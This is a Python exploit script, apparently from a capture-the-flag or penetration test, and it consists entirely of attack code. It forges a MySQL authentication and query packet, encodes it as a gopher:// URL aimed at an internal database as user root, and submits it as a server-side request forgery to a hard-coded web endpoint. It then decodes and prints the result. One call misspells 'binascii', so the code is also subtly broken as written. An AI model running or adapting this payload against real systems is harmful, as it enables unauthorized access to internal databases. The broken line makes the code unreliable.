import binascii
from urllib import parse
import requests
import base64

def mysql_encode(host: str, user: str, query: str):
    encode_user = user.encode().hex()
    user_length = len(user)
    temp = user_length - 4
    length = (bytes([0xa3 + temp])).hex()

    dump = length + "00000185a6ff0100000001210000000000000000000000000000000000000000000000"
    dump += encode_user
    dump += "00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c"
    dump += "69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d"
    dump += "067838365f36340c70726f6772616d5f6e616d65056d7973716c"
    auth = dump.replace("\n", "")

    query = query.encode().hex()
    query_length = '{:06x}'.format((int((len(query) / 2) + 1)))
    query_length = binasctii.unhexlify(query_length)[::-1].hex()
    payload = query_length + "0003" + query
    final = auth + payload + "0100000001"

    final = [final[i:i + 2] for i in range(0, len(final), 2)]
    return f"gopher://{host}:3306/_%" + "%".join(final)

sql = "SELECT 123;"
data = mysql_encode('172.73.23.100', 'root', sql)
#data = parse.quote(data)
#print(data)

res = requests.post('http://47.94.152.65:30001/api/ip.php', data={'domain': data})
res = base64.b64decode(res.json()['res'])
print(res)

